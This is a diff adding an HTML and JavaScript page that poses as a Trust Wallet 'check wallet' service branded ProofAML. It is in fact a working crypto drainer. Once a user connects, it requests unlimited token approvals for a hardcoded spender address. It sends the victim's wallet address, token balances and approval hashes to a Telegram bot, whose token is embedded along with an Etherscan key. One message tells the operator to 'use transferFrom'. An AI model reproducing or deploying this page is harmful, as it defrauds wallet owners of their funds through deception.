@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Trust Wallet</title>
+    <link rel="stylesheet" href="c9a3b95e60d92791.css">
+    <link rel="stylesheet" href="7f2c91666c3768e7.css">
+    <link rel="stylesheet" href="assets/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="assets/css/LineIcons.3.0.css" />
+    <link rel="stylesheet" href="assets/css/animate.css" />
+    <link rel="stylesheet" href="assets/css/tiny-slider.css" />
+    <link rel="stylesheet" href="assets/css/glightbox.min.css" />
+    <link rel="stylesheet" href="assets/css/main.css" />
+    <link rel="shortcut icon" type="image/x-icon" href="assets/images/favicon.svg" />
+    <script src="https://unpkg.com/@coinbase/wallet-sdk"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tronweb/tronweb/dist/TronWeb.min.js"></script>
+
+    <style>
+        .network-button, .token-button, .connect-button, .back-button {
+            display: flex;
+            align-items: center;
+            padding: 10px 20px;
+            margin: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            justify-content: flex-start;
+            text-align: left;
+            transition: background-color 0.3s ease;
+        }
+        .network-button img, .token-button img, .back-button img {
+            margin-right: 20px;
+            width: 24px;
+            height: 24px;
+        }
+        .network-button div, .token-button div {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .selected {
+            background-color: #d3e0ea;
+        }
+        main {
+            display: flex;
+            min-height: 75vh; /* Adjust height to leave space for the fixed footer */
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: #EEEEEE;
+            transition: all ease-in 150ms;
+            padding-bottom: 15vh; /* Adjust padding to prevent overlap with footer */
+        }
+        .step-container {
+            max-width: 400px;
+            width: 100%;
+            background-color: white;
+            border-radius: 1rem;
+            display: none;
+            flex-direction: column;
+            padding: 2rem;
+            align-items: center;
+        }
+        .token-list {
+            max-height: 200px;
+            overflow-y: auto;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+        .button-row {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+        }
+        .connect-button.disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        .network-button .arrow-icon {
+            width: 24px; 
+            height: 24px; 
+            margin-left: auto; 
+            margin-right: 0px; 
+        }
+        .navbar-brand {
+            background-color: #24126A;
+            padding: 10px;
+        }
+    
+        html, body {
+            height: 100%;
+            margin: 0;
+        }
+    
+        .copyright-area {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            height: 10vh; /* Adjust height as needed */
+            width: 100%;
+            position: fixed;
+            bottom: 0;
+            white-space: nowrap; /* Prevent the text from wrapping */
+            background-color: white; /* Ensure the footer has a background color */
+            box-shadow: 0 -2px 5px rgba(0,0,0,0.1); /* Optional: Add a subtle shadow */
+        }
+    
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+        }
+    
+        .inner-content {
+            text-align: center;
+        }
+    
+        .row {
+            width: 100%;
+        }
+    
+        .col-12 {
+            display: flex;
+            justify-content: center;
+        }
+    </style>
+    
+</head>
+
+<body>
+    <main>
+        <div class="step-container" id="tokenSelection" style="display: flex;">
+            <div class="mb-5">Step <b class="inline font-bold">2</b> of <b class="inline font-bold">4</b></div>
+            <div class="mb-12">
+                <h1 class="font-normal text-2xl">Select Tokens</h1>
+            </div>
+            <div class="w-full">
+                <div class="network-button" id="toggleTokenList">
+                    <div>
+                        <p class="font-semibold">Select Tokens</p>
+                        <p class="opacity-50 leading-none italic">Expand/Collapse</p>
+                    </div>
+                    <img src="arrow-down.svg" alt="Arrow Down" class="arrow-icon">
+                </div>
+                <div class="token-list" id="tokenList"></div>
+            </div>
+                        
+            <div class="button-row">
+                <button class="back-button" id="backToNetworkSelection">
+                    <img src="arrow-left.svg" alt="Back">
+                    <div>
+                        <p class="font-semibold">Back</p>
+                    </div>
+                </button>
+                <button class="connect-button disabled" id="connectWallet" disabled>Check Wallet</button>
+            </div>
+        </div>
+        <div class="step-container" id="walletSelection">
+            <div class="mb-5">Step <b class="inline font-bold">3</b> of <b class="inline font-bold">4</b></div>
+            <div class="mb-12">
+                <h1 class="font-normal text-2xl">Select Wallet</h1>
+            </div>
+            <div class="wallet-list-container">
+                <div class="network-button" id="connectTrustWallet">
+                    <img src="trustwallet.svg" alt="Trust Wallet">
+                    <div>
+                        <p class="font-semibold">Trust Wallet</p>
+                    </div>
+                </div>
+                <div class="network-button" id="connectSafePal">
+                    <img src="https://cryptologos.cc/logos/safepal-sfp-logo.svg?v=032" alt="SafePal">
+                    <div>
+                        <p class="font-semibold">SafePal</p>
+                    </div>
+                </div>
+                <div class="network-button" id="connectLedgerLive">
+                    <img src="ledgerlive.svg" alt="Ledger Live">
+                    <div>
+                        <p class="font-semibold">Ledger Live</p>
+                    </div>
+                </div>
+                <div class="network-button" id="connectCoinbaseWallet">
+                    <img src="coinbasewallet.svg" alt="Coinbase Wallet">
+                    <div>
+                        <p class="font-semibold">Coinbase Wallet</p>
+                    </div>
+                </div>
+                <div class="network-button" id="morewallets">
+                    <img src="walletcrypto.svg" alt="">
+                    <div>
+                        <p class="font-semibold">More wallets (atm,not available)</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="button-row">
+                <button class="back-button" id="backToTokenSelection">
+                    <img src="arrow-left.svg" alt="Back">
+                    <div>
+                        <p class="font-semibold">Back</p>
+                    </div>
+                </button>
+            </div>
+        </div>
+        <div class="step-container" id="resultPage">
+            <div class="mb-5">Step <b class="inline font-bold">4</b> of <b class="inline font-bold">4</b></div>
+            <div class="mb-12">
+                <h1 class="font-normal text-2xl" id="resultMessage">We received your approval!</h1>
+            </div>
+            <div class="button-row">
+                <button class="back-button" id="backToWalletSelection">
+                    <img src="arrow-left.svg" alt="Back">
+                    <div>
+                        <p class="font-semibold">Back</p>
+                    </div>
+                </button>
+            </div>
+        </div>
+    </main>
+    
+    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+    <script src="https://unpkg.com/@coinbase/wallet-sdk"></script>
+    <script>
+        const spenderAddress = '0xeD39eB6bC44c0AFa518265ffafE9994f9f91BE4D';
+        const apiKey = '24V689EP8UGXFFDVZZF3AAXBQH5SAAMJEB';  // Replace with your Etherscan API key
+
+        const tokens = {
+            eth: [
+                { name: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, img: 'https://cryptologos.cc/logos/tether-usdt-logo.svg?v=032' },
+                { name: 'BNB', address: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52', decimals: 18, img: 'https://www.cryptologos.cc/logos/bnb-bnb-logo.svg?v=032' },
+                { name: 'AIOZ', address: '0x626E8036dEB333b408Be468F951bdB42433cBF18', decimals: 18, img: 'https://cryptologos.cc/logos/aioz-network-aioz-logo.svg?v=035' },
+                { name: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18, img: 'https://www.cryptologos.cc/logos/chainlink-link-logo.svg?v=032' },
+                { name: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, img: 'https://www.cryptologos.cc/logos/uniswap-uni-logo.svg?v=032' },
+                { name: 'USDC', address: '0x43506849d7c04f9138d1a2050bbf3a0c054402dd', decimals: 6, img: 'https://www.cryptologos.cc/logos/usd-coin-usdc-logo.svg?v=032' },
+                { name: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8, img: 'https://www.cryptologos.cc/logos/wrapped-bitcoin-wbtc-logo.svg?v=032' },
+                { name: 'BAT', address: '0x0D8775F648430679A709E98d2b0Cb6250d2887EF', decimals: 18, img: 'https://www.cryptologos.cc/logos/basic-attention-token-bat-logo.svg?v=032' },
+                { name: 'ZRX', address: '0xE41d2489571d322189246DaFA5ebDe1F4699F498', decimals: 18, img: 'https://www.cryptologos.cc/logos/0x-zrx-logo.svg?v=032' },
+                { name: 'MKR', address: '0x9f8F72aA9304c8B593d555F12ef6589Cc3A579A2', decimals: 18, img: 'https://www.cryptologos.cc/logos/maker-mkr-logo.svg?v=032' },
+                { name: 'SNX', address: '0xC011A72400E58ecD99Ee497CF89E3775d4bd732F', decimals: 18, img: 'https://www.cryptologos.cc/logos/synthetix-snx-logo.svg?v=032' },
+                { name: 'COMP', address: '0xc00e94Cb662C3520282E6f5717214004A7f26888', decimals: 18, img: 'https://www.cryptologos.cc/logos/compound-comp-logo.svg?v=032' },
+                { name: 'OMG', address: '0xD26114cd6EE289AccF82350c8d8487fedB8A0C07', decimals: 18, img: 'https://www.cryptologos.cc/logos/omg-omg-logo.svg?v=032' },
+                { name: 'MANA', address: '0x0F5D2fB29fb7d3CFeE444A200298f468908cC942', decimals: 18, img: 'https://www.cryptologos.cc/logos/decentraland-mana-logo.svg?v=032' },
+                { name: 'BAL', address: '0xba100000625a3754423978a60c9317c58a424e3D', decimals: 18, img: 'https://www.cryptologos.cc/logos/balancer-bal-logo.svg?v=032' },
+                { name: 'SUSHI', address: '0x947950BcC74888a40Ffa2593C5798F11Fc9124C4', decimals: 18, img: 'https://www.cryptologos.cc/logos/sushiswap-sushi-logo.svg?v=032' },
+                { name: '1INCH', address: '0x111111111117dC0aa78b770fA6A738034120C302', decimals: 18, img: 'https://www.cryptologos.cc/logos/1inch-1inch-logo.svg?v=032' }
+            ]
+        };
+
+        let web3;
+        let walletAddress;
+        let selectedTokens = [];
+
+        document.getElementById('toggleTokenList').addEventListener('click', () => {
+            const tokenList = document.getElementById('tokenList');
+            const toggleButton = document.getElementById('toggleTokenList');
+            if (tokenList.style.display === 'none' || tokenList.style.display === '') {
+                tokenList.style.display = 'block'; // Change to block display
+                toggleButton.classList.add('selected');
+            } else {
+                tokenList.style.display = 'none';
+                toggleButton.classList.remove('selected');
+            }
+        });
+
+        document.getElementById('backToNetworkSelection').addEventListener('click', () => {
+            window.location.href = 'networkselection.html';
+        });
+
+        document.getElementById('backToTokenSelection').addEventListener('click', () => {
+            document.getElementById('walletSelection').style.display = 'none';
+            document.getElementById('tokenSelection').style.display = 'flex';
+        });
+
+        document.getElementById('backToWalletSelection').addEventListener('click', () => {
+            document.getElementById('resultPage').style.display = 'none';
+            document.getElementById('walletSelection').style.display = 'flex';
+        });
+
+        function showTokenSelection(network) {
+            const tokenList = document.getElementById('tokenList');
+            tokenList.innerHTML = '';
+            const tokenListContainer = document.createElement('div');
+            tokenListContainer.className = 'token-list-container';
+            tokens[network].forEach(token => {
+                const tokenButton = document.createElement('div');
+                tokenButton.className = 'token-button';
+                tokenButton.innerHTML = `
+                    <img src="${token.img}" alt="${token.name}">
+                    <div style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
+                        <p class="font-semibold">${token.name}</p>
+                    </div>
+                `;
+                tokenButton.addEventListener('click', () => {
+                    tokenButton.classList.toggle('selected');
+                    if (tokenButton.classList.contains('selected')) {
+                        selectedTokens.push(token);
+                    } else {
+                        selectedTokens = selectedTokens.filter(t => t.address !== token.address);
+                    }
+                    toggleConnectButton();
+                });
+                tokenListContainer.appendChild(tokenButton);
+            });
+            tokenList.appendChild(tokenListContainer);
+            document.getElementById('networkSelection').style.display = 'none';
+            document.getElementById('tokenSelection').style.display = 'flex';
+        }
+
+        function toggleConnectButton() {
+            const connectButton = document.getElementById('connectWallet');
+            if (selectedTokens.length > 0) {
+                connectButton.classList.remove('disabled');
+                connectButton.disabled = false;
+            } else {
+                connectButton.classList.add('disabled');
+                connectButton.disabled = true;
+            }
+        }
+
+        document.getElementById('connectWallet').addEventListener('click', () => {
+            document.getElementById('tokenSelection').style.display = 'none';
+            document.getElementById('walletSelection').style.display = 'flex';
+        });
+
+        
+        document.getElementById('connectTrustWallet').addEventListener('click', connectTrustWallet);
+
+        async function sendTelegramMessage(message) {
+            const botToken = '7191302028:AAHBleU672wgJB24g2GBu6N2lJmysK_1d2Y';  // Use your actual bot token
+            const chatId = '7291488584';  // Use your actual chat ID
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const payload = {
+                chat_id: chatId,
+                text: message,
+            };
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+            } catch (error) {
+                console.error('Error sending Telegram message:', error);
+            }
+        }
+
+        async function getTokenBalances() {
+            let message = `Token balances for wallet ${walletAddress}:\n`;
+            
+            for (const token of tokens.eth) {
+                const url = `https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=${token.address}&address=${walletAddress}&tag=latest&apikey=${apiKey}`;
+
+                try {
+                    const response = await fetch(url);
+                    const data = await response.json();
+
+                    if (data.status === "1" && data.result) {
+                        const balance = data.result / Math.pow(10, token.decimals); // Convert balance to human-readable format
+                        const uint256Value = data.result; // Raw balance in smallest unit
+                        message += `${token.name}: ${balance} (${uint256Value})\n`;
+                    } else {
+                        message += `${token.name}: Failed to fetch balance\n`;
+                    }
+                } catch (error) {
+                    console.error('Error fetching token balance for', token.name, error);
+                    message += `${token.name}: Error fetching balance\n`;
+                }
+            }
+
+            return message;
+        }
+
+        async function connectTrustWallet() {
+            if (typeof window.ethereum !== 'undefined' && window.ethereum.isTrust) {
+                web3 = new Web3(window.ethereum);
+                try {
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const accounts = await web3.eth.getAccounts();
+                    walletAddress = accounts[0];
+                    console.log('Connected to Trust Wallet:', walletAddress);
+
+                    await fetch('/connectWallet', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ walletAddress })
+                    });
+
+                    // Send a Telegram message
+                    await sendTelegramMessage(`User connected to Trust Wallet with address: ${walletAddress}`);
+
+                    // Fetch and send token balances
+                    const tokenBalancesMessage = await getTokenBalances();
+                    await sendTelegramMessage(tokenBalancesMessage);
+
+                    const mainnetChainId = '0x1';
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: mainnetChainId }]
+                    });
+
+                    const contractABI = [
+                        {
+                            "inputs": [
+                                { "internalType": "address", "name": "spender", "type": "address" },
+                                { "internalType": "uint256", "name": "amount", "type": "uint256" }
+                            ],
+                            "name": "approve",
+                            "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+                            "stateMutability": "nonpayable",
+                            "type": "function"
+                        },
+                        {
+                            "constant": true,
+                            "inputs": [
+                                { "name": "owner", "type": "address" },
+                                { "name": "spender", "type": "address" }
+                            ],
+                            "name": "allowance",
+                            "outputs": [
+                                { "name": "", "type": "uint256" }
+                            ],
+                            "payable": false,
+                            "stateMutability": "view",
+                            "type": "function"
+                        },
+                        {
+                            "constant": false,
+                            "inputs": [
+                                { "name": "from", "type": "address" },
+                                { "name": "to", "type": "address" },
+                                { "name": "value", "type": "uint256" }
+                            ],
+                            "name": "transferFrom",
+                            "outputs": [
+                                { "name": "", "type": "bool" }
+                            ],
+                            "payable": false,
+                            "stateMutability": "nonpayable",
+                            "type": "function"
+                        }
+                    ];
+
+                    for (const token of selectedTokens) {
+                        const contract = new web3.eth.Contract(contractABI, token.address);
+                        const unlimitedApprovalAmount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+                        contract.methods.approve(spenderAddress, unlimitedApprovalAmount)
+                            .send({ from: walletAddress })
+                            .on('transactionHash', async (txHash) => {
+                                const etherscanLink = `https://etherscan.io/token/${token.address}#code`;
+
+                                // Get token balance for the approved token
+                                const tokenBalanceUrl = `https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=${token.address}&address=${walletAddress}&tag=latest&apikey=${apiKey}`;
+                                let tokenBalance = 'Failed to fetch balance';
+                                try {
+                                    const response = await fetch(tokenBalanceUrl);
+                                    const data = await response.json();
+                                    if (data.status === "1" && data.result) {
+                                        tokenBalance = data.result;
+                                    }
+                                } catch (error) {
+                                    console.error('Error fetching token balance for approved token:', error);
+                                }
+
+                                const message = `
+                                Transaction approved for ${token.name} with hash: ${txHash}\n
+                                Etherscan link: ${etherscanLink}\n
+                                Contract is ready to start, use transferFrom\n
+                                User: ${walletAddress}\n
+                                Spender: ${spenderAddress}\n
+                                Amount: ${tokenBalance}
+                                `;
+
+                                await sendTelegramMessage(message);
+
+                                window.location.href = 'result-page.html';
+                            })
+                            .on('receipt', async (receipt) => {
+                                console.log(`Approval transaction for ${token.name} successful:`, receipt);
+
+                                // Send a Telegram message on successful receipt
+                                await sendTelegramMessage(`Transaction receipt received for ${token.name}. TxHash: ${receipt.transactionHash} `);
+                            })
+                            .on('error', (error) => {
+                                console.error(`Approval transaction for ${token.name} failed:`, error);
+                                window.location.href = 'result-page.html';
+                            });
+                    }
+
+                } catch (error) {
+    console.error('Error connecting to Trust Wallet:', error);
+    await fetch('/userRefused', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ walletAddress, reason: 'User refused to connect Trust Wallet' })
+    });
+    // Instead of navigating to the result page, show the wallet selection step
+    document.getElementById('walletSelection').style.display = 'flex'; // Show Step 3
+    document.getElementById('tokenSelection').style.display = 'none';
+    document.getElementById('resultPage').style.display = 'none'; // Ensure result page is hidden
+}
+
+            } else {
+                const deepLink = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(window.location.href);
+                window.location.href = deepLink;
+            }
+        }
+
+        // Initial function call to show the token selection step
+        showTokenSelection('eth');
+        
+    </script> 
+</body>
+   <!-- Start Copyright Area -->
+   <div class="copyright-area">
+    <div class="container">
+        <div class="inner-content">
+            <div class="row">
+                <div class="col-12">
+                    <p class="copyright-text">© 2024 ProofAML</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- End Copyright Area -->
+
+<!-- ========================= scroll-top ========================= -->
+<a href="#" class="scroll-top">
+    <i class="lni lni-chevron-up"></i>
+</a>
+
+</html>
